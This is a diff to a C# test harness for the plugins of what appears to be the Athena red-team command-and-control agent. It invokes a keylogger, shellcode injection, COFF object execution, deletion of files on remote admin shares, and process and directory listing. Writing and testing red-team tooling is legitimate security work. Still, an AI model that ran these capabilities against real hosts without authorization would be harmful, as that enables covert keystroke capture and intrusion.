@@ -21,31 +21,36 @@ namespace TestPluginLoader
         public static AssemblyLoadContext loadcontext = new AssemblyLoadContext("commands");
         static async Task Main(string[] args)
         {
-            Dictionary<string, string> parameters = new Dictionary<string, string>();
-            parameters.Add("task-id", "1");
-            await TestReg(parameters);
+            Console.WriteLine("Starting Keylogger.");
+            Task.Run(() => TestKeylogger());
+            Console.WriteLine("Delaying.");
+            await Task.Delay(10000);
+            Console.WriteLine("Done.");
             var res = await TaskResponseHandler.GetTaskResponsesAsync();
             Console.WriteLine(res.FirstOrDefault());
             Console.WriteLine("Finished.");
             Console.ReadKey();
         }
 
-        static async Task TestCoff(Dictionary<string, string> parameters)
+        static async Task TestCoff()
         {
+            Dictionary<string, string> parameters = new Dictionary<string, string>();
             parameters.Add("asm", Misc.Base64Encode(File.ReadAllBytes(@"C:\Users\scott\Downloads\whoami.x64.o")));
             parameters.Add("functionName", "go");
             parameters.Add("arguments","");
             parameters.Add("timeout", "30");
 
+            parameters.Add("task-id", "1");
             new Coff().Execute(parameters);
             var res = await TaskResponseHandler.GetTaskResponsesAsync();
             Console.WriteLine(res.FirstOrDefault());
         }
 
-        static async Task TestShellcodeInject(Dictionary<string, string> parameters)
+        static async Task TestShellcodeInject()
         {
             string json = "{\"blockDlls\":false , \"output\":false}";
 
+            Dictionary<string, string> parameters = Misc.ConvertJsonStringToDict(json);
 
             //Dictionary<string, string> parameters = new Dictionary<string, string>();
             //parameters.Add("asm", Misc.Base64Encode(File.ReadAllBytes(@"C:\Users\scott\Downloads\Seatbelt\Seatbelt.bin")));
@@ -57,27 +62,32 @@ namespace TestPluginLoader
             parameters.Add("blockdlls", "true");
             //parameters.Add("functionName", "go");
             //parameters.Add("timeout", "60");
-            IPlugin plugin = new InjectShellcode();
+            parameters.Add("task-id", "1");
+            IPlugin plugin = new ShellcodeInject();
 
             plugin.Execute(parameters);
 
             var res = await TaskResponseHandler.GetTaskResponsesAsync();
             Console.WriteLine(res.FirstOrDefault());
         }
-        static async Task TestRm(Dictionary<string, string> parameters)
+        static async Task TestRm()
         {
+            Dictionary<string, string> parameters = new Dictionary<string, string>();
             parameters.Add("host", "mydesktop");
             parameters.Add("path", @"C$\Users\scott\Downloads\");
             parameters.Add("file", "test.txt");
+            parameters.Add("task-id", "1");
             new Rm().Execute(parameters);
             var res = await TaskResponseHandler.GetTaskResponsesAsync();
             Console.WriteLine(res.FirstOrDefault());
         }
 
-        static async Task TestLs(Dictionary<string, string> parameters)
+        static async Task TestLs()
         {
             //string json = """{"path": "Users\\scott\\source\\repos\\Athena\\athena", "host": "DESKTOP-GRJNOH2"}""";
             string json = """{"path": "C:", "host": "DESKTOP-GRJNOH2"}""";
+            Dictionary<string, string> parameters = Misc.ConvertJsonStringToDict(json);
+            parameters.Add("task-id", "1");
             IPlugin plug = new Ls();
 
             plug.Execute(parameters);
@@ -86,24 +96,20 @@ namespace TestPluginLoader
 
         }
 
-        static async Task TestPs(Dictionary<string, string> parameters)
+        static async Task TestPs()
         {
+            Dictionary<string, string> parameters = new Dictionary<string, string>();
+            parameters.Add("task-id", "1");
             new Ps().Execute(parameters);
             var res = await TaskResponseHandler.GetTaskResponsesAsync();
             Console.WriteLine(res.FirstOrDefault());
         }
 
-        static async Task TestKeylogger(Dictionary<string, string> parameters)
+        static async Task TestKeylogger()
         {
+            Dictionary<string, string> parameters = new Dictionary<string, string>();
+            parameters.Add("task-id", "1");
             new Keylogger().Execute(parameters);
-        }
-
-        static async Task TestReg(Dictionary<string, string> parameters)
-        {
-            parameters.Add("keypath", @"HKEY_CURRENT_USER\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run");
-            parameters.Add("action", @"query");
-            parameters.Add("hostname", "127.0.0.1");
-            new Reg().Execute(parameters);
         }
     }
 }
